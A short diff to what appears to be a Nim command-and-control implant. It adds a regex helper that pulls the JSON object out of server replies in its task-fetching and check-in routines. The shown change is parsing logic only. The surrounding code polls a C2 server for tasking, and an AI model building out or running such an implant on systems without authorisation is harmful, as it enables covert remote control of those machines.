@@ -16,6 +16,17 @@ proc error*(message: string, exception: ref Exception) =
     echo message
     echo exception.getStackTrace()
 
+proc parseJString(s: string): string = 
+    var matches: array[1, string]
+    var matched = find(s, re(r"{(.+)}", flags={reDotAll}), matches)
+
+    var combString = "{"
+
+    if matched >= 0:
+        combString = combString & matches[0]
+
+    result = combString & "}"
+
 proc getTasks* : Future[seq[Task]] {.async.} = 
     var tasks: seq[Task]
     let taskJson = %*{"action" : "get_tasking", "tasking_size": -1 }
@@ -32,7 +43,8 @@ proc getTasks* : Future[seq[Task]] {.async.} =
             echo "Payload UUID is not matching up when getting tasks something is wrong..."
         return tasks
     # https://nim-lang.org/docs/system.html#%5E.t%2Cint
-    var resp = parseJson(temp[36 .. ^1])
+    var sanitisedString = parseJString(temp)
+    var resp = parseJson(sanitisedString)
     for jnode in getElems(resp["tasks"]):
         when not defined(release):
             echo "jnode: ", jnode
@@ -55,7 +67,8 @@ proc checkIn: Future[bool] {.async.} =
         let temp = when defined(CRYPTO): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
         when not defined(release):
             echo "decoded temp: ", temp
-        var resp = parseJson(temp[36 .. ^2])
+        var sanitisedString = parseJString(temp)
+        var resp = parseJson(sanitisedString)
         when not defined(release):
             echo "resp from checkin: ", resp
         if(cmp(resp["status"].getStr(), "success") == 0):
